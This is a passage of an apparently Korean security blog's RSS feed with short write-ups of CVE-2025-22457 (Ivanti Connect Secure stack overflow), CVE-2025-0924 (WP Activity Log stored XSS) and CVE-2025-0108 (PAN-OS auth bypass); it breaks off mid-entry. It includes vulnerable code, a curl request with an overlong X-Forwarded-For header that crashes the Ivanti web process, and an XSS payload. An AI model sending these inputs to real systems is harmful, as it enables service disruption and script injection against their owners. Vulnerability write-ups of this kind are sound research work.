&#xCDE8;&#xC57D;&#xC810;&#xAE4C;&#xC9C0;&#xB294; &#xB9C9;&#xD614;&#xB354;&#xB77C;&#xB3C4;, python &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xAD6C;&#xC870;&#xB294; &#xC5EC;&#xC804;&#xD558;&#xAE30;&#xC5D0; Account Takeover &#xB098; &#xC138;&#xC158; &#xD0C8;&#xCDE8;&#xC640; &#xAC19;&#xC740; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC5F0;&#xACC4;&#xD55C;&#xB2E4;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC7AC;&#xBC1C;&#xD604; &#xB420; &#xC218;&#xB3C4; &#xC788;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xB124;&#xC694;. &#x1F625;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://github.com/xuemian168/CVE-2025-3248/">https://github.com/xuemian168/CVE-2025-3248/</a></p></li><li><p><a href="https://github.com/langflow-ai/langflow">https://github.com/langflow-ai/langflow</a></p></li><li><p><a href="https://github.com/langflow-ai/langflow/pull/6911/commits/dbae45f5717b9bf0f3096fce7399851aba27e658">https://github.com/langflow-ai/langflow/pull/6911/commits/dbae45f5717b9bf0f3096fce7399851aba27e658</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/LangFlow/">LangFlow</category>
      
      <category domain="https://hackyboiz.github.io/tags/code-injection/">code injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/AI/">AI</category>
      
      <category domain="https://hackyboiz.github.io/tags/AI-Agent/">AI Agent</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-3248/">CVE-2025-3248</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/13/mungsul/2025-04-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-22457: Ivanti Connect Secure의 X-Forwarded-For Stack Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/10/j0ker/2025-04-10/</link>
      <guid>https://hackyboiz.github.io/2025/04/10/j0ker/2025-04-10/</guid>
      <pubDate>Thu, 10 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://labs.watchtowr.com/is-the-sofistication-in-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://labs.watchtowr.com/is-the-sofistication-in-the-room-with-us-x-forwarded-for-and-ivanti-connect-secure-cve-2025-22457/">Is The Sofistication In The Room With Us? - X-Forwarded-For and Ivanti Connect Secure (CVE-2025-22457)</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Connect Secure &lt;= 22.7R2.5</li><li>Pulse Connect Secure (EOS) &lt;= 9.1R18.9</li><li>Ivanti Policy Secure &lt;= 22.7R1.3</li><li>ZTA Gateways &lt;= 22.8R2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ivanti Connect Secure&#xB294; &#xAE30;&#xC5C5; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xACBD;&#xACC4;&#xC5D0;&#xC11C; VPN &#xC811;&#xC18D; &#xBC0F; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; SSL VPN &#xC7A5;&#xBE44;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC7A5;&#xBE44;&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC6D0;&#xACA9; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE)&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xC2A4;&#xD0DD; &#xAE30;&#xBC18; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;(CVE-2025-22457)&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>web</code> &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xC758; HTTP &#xC694;&#xCCAD; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;, &#xD2B9;&#xD788; <code>WebRequest::dispatchRequest</code> &#xD568;&#xC218;&#xB85C; &#xCD94;&#xC815;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. [Source 37, 42] &#xC774; &#xB85C;&#xC9C1;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC124;&#xC815; &#xAC00;&#xB2A5;&#xD55C; <code>CUSTOM_IP_FIELD</code> &#xAD6C;&#xC131; &#xAC12;&#xC5D0; &#xC9C0;&#xC815;&#xB41C; HTTP &#xD5E4;&#xB354; (&#xAE30;&#xBCF8;&#xAC12;: <code>X-Forwarded-For</code>)&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB294; &#xD574;&#xB2F9; &#xD5E4;&#xB354; &#xAC12;&#xC744; &#xBC1B;&#xC544; <code>strspn</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAC12; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC5D0; &#xC22B;&#xC790;(<code>0-9</code>)&#xC640; &#xB9C8;&#xCE68;&#xD45C;(<code>.</code>)&#xB85C;&#xB9CC; &#xAD6C;&#xC131;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;(<code>ipLen</code>)&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4;, <code>alloca</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>ipLen + 2</code> &#xD06C;&#xAE30;&#xC758; &#xBC84;&#xD37C;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xACE0;, <code>strlcpy</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD5E4;&#xB354; &#xAC12;&#xC758; &#xC77C;&#xBD80;(<code>ipLen + 1</code> &#xBC14;&#xC774;&#xD2B8;)&#xB97C; &#xC774; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C;&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">headerValue = httpHeader-&gt;Value;ipLen = <span class="hljs-built_in">strspn</span>(headerValue, <span class="hljs-string">&quot;0123456789.&quot;</span>);v58 = alloca(ipLen + <span class="hljs-number">2</span>); strlcpy(&amp;v178, *(_DWORD *)&amp;v176[<span class="hljs-number">4</span>], ipLen + <span class="hljs-number">1</span>);strlcpy(s, headerValue, ipLen + <span class="hljs-number">1</span>);</code></pre><p>&#xACF5;&#xACA9;&#xC790;&#xB294; <code>X-Forwarded-For</code> &#xD5E4;&#xB354;&#xC5D0; &#xC22B;&#xC790;&#xC640; &#xB9C8;&#xCE68;&#xD45C;&#xB85C;&#xB9CC; &#xAD6C;&#xC131;&#xB41C; &#xB9E4;&#xC6B0; &#xAE34; &#xAC12;&#xC744; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; HTTP &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; <code>ipLen</code> &#xAC12;&#xC774; &#xB9E4;&#xC6B0; &#xCEE4;&#xC9C0;&#xAC8C; &#xB418;&#xACE0;, <code>alloca</code> &#xD568;&#xC218;&#xAC00; &#xC2A4;&#xD0DD;&#xC5D0; &#xACFC;&#xB3C4;&#xD558;&#xAC8C; &#xD070; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD558;&#xAC70;&#xB098; <code>strlcpy</code> &#xD568;&#xC218;&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;&#xC758; &#xACBD;&#xACC4;&#xB97C; &#xB118;&#xC5B4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; <code>web</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC885;&#xB8CC;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Ivanti&#xB294; &#xCC98;&#xC74C;&#xC5D0; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC22B;&#xC790;&#xC640; &#xB9C8;&#xCE68;&#xD45C;&#xB85C;&#xB9CC; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC5EC; &#xC2E4;&#xC81C; RCE&#xB098; DoS&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC73C;&#xB098;, &#xC774;&#xD6C4; &#x201C;&#xC815;&#xAD50;&#xD55C; &#xBC29;&#xBC95;(sophisticated means)&#x201D;&#xC744; &#xD1B5;&#xD574; &#xC2E4;&#xC81C; RCE &#xACF5;&#xACA9;&#xC5D0; &#xC545;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Mandiant&#xC5D0; &#xB530;&#xB974;&#xBA74; 2025&#xB144; 3&#xC6D4; &#xC911;&#xC21C;&#xBD80;&#xD130; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4; &#xBC31;&#xB3C4;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294; &#xB370; &#xC774;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB824;&#xBA74; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xAE34; <code>X-Forwarded-For</code> &#xD5E4;&#xB354;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">curl -k https://&lt;TARGET_IP&gt;/ --header <span class="hljs-string">&quot;X-Forwarded-For: 1111111111111111111111111111111111111111111111111111111111111111.1111...&quot;</span></code></pre><p>&#xC11C;&#xBC84; &#xCE21;&#xC5D0;&#xC11C; <code>web</code> &#xD504;&#xB85C;&#xC138;&#xC2A4; crash &#xB85C;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xD328;&#xCE58;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; HTTP 400 &#xC751;&#xB2F5;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ivanti/">ivanti</category>
      
      <category domain="https://hackyboiz.github.io/tags/connect-secure/">connect_secure</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-buffer-overflow/">stack_buffer_overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/x-forwarded-for/">x-forwarded-for</category>
      
      <category domain="https://hackyboiz.github.io/tags/itw/">itw</category>
      
      <category domain="https://hackyboiz.github.io/tags/in-the-wild/">in the wild</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/10/j0ker/2025-04-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-0924: WP Activity Log의 Stored Cross-Site Scripting (XSS)취약점</title>
      <link>https://hackyboiz.github.io/2025/04/09/romi0x/1day1line0409/</link>
      <guid>https://hackyboiz.github.io/2025/04/09/romi0x/1day1line0409/</guid>
      <pubDate>Wed, 09 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-0924&quot;&gt;https://n</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0924">https://nvd.nist.gov/vuln/detail/CVE-2025-0924</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>WP Activity Log v5.2.2 &#xC774;&#xD558; &#xBAA8;&#xB4E0; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WP Activity Log&#xB294; &#xC6CC;&#xB4DC;&#xD504;&#xB808;&#xC2A4; &#xC0AC;&#xC774;&#xD2B8;&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xD65C;&#xB3D9;&#xC744; &#xAE30;&#xB85D;&#xD558;&#xACE0; &#xCD94;&#xC801;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC778;&#xAE30; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC785;&#xB2C8;&#xB2E4;. &#xAD00;&#xB9AC;&#xC790; &#xBC0F; &#xBCF4;&#xC548; &#xB2F4;&#xB2F9;&#xC790;&#xB4E4;&#xC774; &#xC2DC;&#xC2A4;&#xD15C; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xACFC; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>class-alert-manager.php</code>&#xC758; <code>LogCustomEvent()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xAC12;&#xC778; <code>message</code>&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294;&#xB370;, <code>sanitize_text_field()</code>&#xB9CC; &#xC801;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC5B4; &#xBD88;&#xC644;&#xC804;&#xD55C; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php">$message = <span class="hljs-keyword">isset</span>( $_POST[<span class="hljs-string">&apos;message&apos;</span>] ) ? sanitize_text_field( wp_unslash( $_POST[<span class="hljs-string">&apos;message&apos;</span>] ) ) : <span class="hljs-string">&apos;&apos;</span>;</code></pre><p>&#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xB41C; <code>sanitize_text_field()</code>&#xB294; <code>&lt;script&gt;</code>&#xC640; &#xAC19;&#xC740; &#xBA85;&#xBC31;&#xD55C; HTML &#xD0DC;&#xADF8;&#xB294; &#xC81C;&#xAC70;&#xD558;&#xC9C0;&#xB9CC;, HTML &#xC18D;&#xC131; &#xAE30;&#xBC18;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;(&#xC608;: <code>&lt;img onerror=alert(1)&gt;</code>)&#xAE4C;&#xC9C0;&#xB294; &#xC81C;&#xAC70;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xD55C;&#xACC4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBD88;&#xC644;&#xC804;&#xD55C; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; &#xCC98;&#xB9AC;&#xB41C; <code>message</code> &#xAC12;&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>TriggerCustomEvent()</code>&#xB97C; &#xD1B5;&#xD574; &#xACBD;&#xACE0;(alert)&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xBA70;, &#xC774;&#xD6C4; <code>class-alert.php</code>&#xC758; <code>GetMessage()</code> &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xB2E4;&#xC2DC; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;:</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetMessage</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_message;</code></pre><p><code>$this-&gt;_message</code>&#xB294; DB&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xB2F4;&#xAE34; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xC774; &#xAC12;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; <strong>escaping &#xC5C6;&#xC774; &#xADF8;&#xB300;&#xB85C; HTML&#xC5D0; &#xC0BD;&#xC785;</strong>&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;:</p><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;div class=&quot;log-entry&quot;&gt;&apos;</span> . $alert-&gt;GetMessage() . <span class="hljs-string">&apos;&lt;/div&gt;&apos;</span>;</code></pre><p>&#xC774;&#xCC98;&#xB7FC; &#xCD9C;&#xB825; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; <code>esc_html()</code> &#xB610;&#xB294; <code>wp_kses()</code> &#xB4F1; &#xC801;&#xC808;&#xD55C; escaping &#xCC98;&#xB9AC;&#xAC00; &#xB204;&#xB77D;&#xB418;&#xC5B4; &#xC788;&#xC5B4;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0BD;&#xC785;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xB85C;&#xADF8;&#xB97C; &#xC5F4;&#xB78C;&#xD558;&#xB294; &#xAD00;&#xB9AC;&#xC790; &#xB610;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/xss/">xss</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/WordPress/">WordPress</category>
      
      <category domain="https://hackyboiz.github.io/tags/WP-Activity-Log/">WP Activity Log</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/09/romi0x/1day1line0409/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-0108: PAN-OS Nginx/Apache Path Confusion을 통한 인증 우회 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/03/clalxk/CVE-2025-0108/</link>
      <guid>https://hackyboiz.github.io/2025/04/03/clalxk/CVE-2025-0108/</guid>
      <pubDate>Thu, 03 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.assetnote.io/resources/research/nginx-apache-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os">https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PAN-OS 10.2.x &lt; 10.2.13-h3</li><li>PAN-OS 11.0.x &lt; 11.1.6-h1</li><li>PAN-OS 11.2.x &lt; 11.2.4-h4</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-0108&#xC740; <strong>Palo Alto Networks PAN-OS&#xC758; &#xBC29;&#xD654;&#xBCBD; &#xAD00;&#xB9AC; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;</strong>&#xC785;&#xB2C8;&#xB2E4;. Assetnote &#xC5F0;&#xAD6C;&#xD300;&#xC774; <strong>CVE-2024-0012 &#xBC0F; CVE-2024-9474</strong>&#xC758; &#xD328;&#xCE58;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC804; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;(CVE-2024-0012 &#xBC0F; CVE-2024-9474)&#xC740; &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC774; <strong>PAN-OS &#xBC29;&#xD654;&#xBCBD;&#xC744; &#xBB34;&#xB825;&#xD654;&#xD558;&#xC5EC; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD558;&#xB294; &#xB370; &#xC545;&#xC6A9;</strong>&#xB418;&#xC5C8;&#xACE0;, &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58; &#xACFC;&#xC815;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xC911;, &#xC5F0;&#xAD6C;&#xD300;&#xC740; <strong>PAN-OS &#xAD00;&#xB9AC; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xB0B4;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;</strong>&#xD588;&#xACE0;, &#xC774;&#xB97C; &#xD1B5;&#xD574; <strong>CVE-2025-0108&#xC774;&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</strong></p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>Nginx &#x2192; Apache &#x2192; PHP&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xBCF5;&#xC7A1;&#xD55C; &#xC778;&#xC99D; &#xCC98;&#xB9AC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Path Confusion &#xBC0F; URL &#xC774;&#xC911; &#xB514;&#xCF54;&#xB529;(Double URL Decoding) &#xBB38;&#xC81C;</strong>&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xC778;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.<br>PAN-OS&#xC758; &#xAD00;&#xB9AC; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC6F9; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;:</p><h3 id="1-Nginx-&#xB2E8;&#xACC4;"><a href="#1-Nginx-&#xB2E8;&#xACC4;" class="headerlink" title="1. Nginx &#xB2E8;&#xACC4;"></a><strong>1. Nginx &#xB2E8;&#xACC4;</strong></h3><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC694;&#xCCAD;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xACE0;, <code>X-pan-AuthCheck</code> &#xD5E4;&#xB354;&#xB97C; &#xC124;&#xC815;&#xD558;&#xC5EC; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD2B9;&#xC815; &#xACBD;&#xB85C;(<code>/unauth/</code> &#xD3EC;&#xD568;)&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xC694;&#xCCAD;&#xC744; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694; &#xC5C6;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs gams"><span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span>uri ~ ^\/unauth\/.+<span class="hljs-symbol">$</span>) {  <span class="hljs-keyword">set</span> $panAuthCheck <span class="hljs-comment">&apos;off&apos;</span>;}</code></pre><p>&#xC774;&#xB85C; &#xC778;&#xD574; <code>/unauth/</code> &#xACBD;&#xB85C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC694;&#xCCAD;&#xB4E4;&#xC740; <code>X-pan-AuthCheck: off</code>&#xAC00; &#xC124;&#xC815;&#xB418;&#xBA70;, &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><hr><h3 id="2-Apache-&#xB2E8;&#xACC4;"><a href="#2-Apache-&#xB2E8;&#xACC4;" class="headerlink" title="2. Apache &#xB2E8;&#xACC4;"></a><strong>2. Apache &#xB2E8;&#xACC4;</strong></h3><p>Nginx&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xC694;&#xCCAD;&#xC744; &#xB2E4;&#xC2DC; &#xCC98;&#xB9AC;&#xD558;&#xACE0;, <code>mod_rewrite</code>&#xB97C; &#xD1B5;&#xD574; &#xD2B9;&#xC815; &#xACBD;&#xB85C;&#xB97C; &#xC7AC;&#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-section">&lt;Location <span 